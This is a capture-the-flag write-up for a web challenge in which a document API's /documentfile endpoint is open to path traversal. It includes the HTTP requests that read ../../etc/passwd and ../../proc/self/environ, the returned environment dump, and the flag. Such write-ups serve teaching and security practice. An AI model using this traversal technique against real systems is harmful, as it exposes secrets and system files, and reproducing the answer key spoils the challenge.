# WEBIFILE - Writeup

**Category:** `Web`  
**Challenge:** `webifile`
**Description:** `Find the flag. It's documented!`

## Summary

This challenge exposes its intended attack surface directly in the frontend JavaScript on the authenticated `/documents` page.

After registering and logging in, the application reveals several JSON API endpoints:

- `POST /documents`
- `GET /documents/<id>`
- `DELETE /documents/<id>`
- `POST /files`
- `POST /documentfile`

The vulnerable endpoint is `POST /documentfile`, which creates a document from a server-side file path supplied by the user. The backend prepends `/tmp/app/` to the provided filename but does not sanitize traversal sequences like `../../`.

That lets us read arbitrary files from the container by:

1. Creating a document from a traversed file path
2. Reading the newly created document back through `GET /documents/<id>`

The flag was stored in the process environment and was recovered from:

- `../../proc/self/environ`

## Recon

The landing page only shows login and register options:

- `/`
- `/login`
- `/register`

After creating a normal user and logging in, the authenticated page `/documents` contains a full HTML/JavaScript interface for document management.

The important part is the client-side JavaScript, which effectively documents the backend API:

```javascript
fetch('/documents', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
})

fetch(`/documents/${documentId}`, { method: 'GET' })

fetch(`/documents/${documentId}`, { method: 'DELETE' })

fetch('/files', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
})

fetch('/documentfile', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
})
```

That matches the challenge hint: **"It's documented!"**

## Initial Testing

The suspicious endpoint is:

- `POST /documentfile`

It takes:

```json
{
  "filename": "something",
  "title": "something"
}
```

Testing it with non-existent files produced backend error messages that leaked the server-side path handling:

```json
{
  "message": "[Errno 2] No such file or directory: '/tmp/app/a.txt'"
}
```

Trying traversal confirmed that user-controlled input is appended directly:

```json
{
  "message": "[Errno 2] No such file or directory: '/tmp/app/../../etc/passwd'"
}
```

This proves the endpoint is reading from:

```text
/tmp/app/<user-controlled filename>
```

with no traversal mitigation.

## Exploit Strategy

Instead of guessing app files immediately, a reliable first target is:

- `../../proc/self/environ`

Why:

- It almost always exists
- It is readable by the running process
- CTF flags are often injected into environment variables

If the read succeeds, the application stores the file content as a new document and returns a document ID.

We can then fetch that document via:

- `GET /documents/<id>`

## Exploitation

### 1. Register

Example request:

```http
POST /register HTTP/1.1
Host: nexus-nektar-da060a0f.challs.0xv01d-ctf.xyz
Content-Type: application/x-www-form-urlencoded

username=ctf7421&password=pass123
```

### 2. Login

Example request:

```http
POST /login HTTP/1.1
Host: nexus-nektar-da060a0f.challs.0xv01d-ctf.xyz
Content-Type: application/x-www-form-urlencoded

username=ctf7421&password=pass123
```

This returns a valid session cookie.

### 3. Create a document from `../../proc/self/environ`

```http
POST /documentfile HTTP/1.1
Host: nexus-nektar-da060a0f.challs.0xv01d-ctf.xyz
Content-Type: application/json
Cookie: session=<valid session>

{
  "filename": "../../proc/self/environ",
  "title": "probe"
}
```

Successful response:

```json
{
  "id": 1,
  "message": "Document added",
  "success": true
}
```

### 4. Read the created document

```http
GET /documents/1 HTTP/1.1
Host: nexus-nektar-da060a0f.challs.0xv01d-ctf.xyz
Cookie: session=<valid session>
```

Response:

```json
{
  "content": "HOSTNAME=6deb7d2e76e4\u0000PWD=/usr/src/app\u0000PORT=8862\u0000HOME=/home/appuser\u0000FLAG=0xV01D{9aa1f157-4be0-4160-9d11-620c266ca81b}\u0000SHLVL=1\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000_=/usr/local/bin/gunicorn\u0000",
  "success": true,
  "title": "probe"
}
```

The flag is visible directly in the environment dump.

## Flag

```text
0xV01D{9aa1f157-4be0-4160-9d11-620c266ca81b}
```
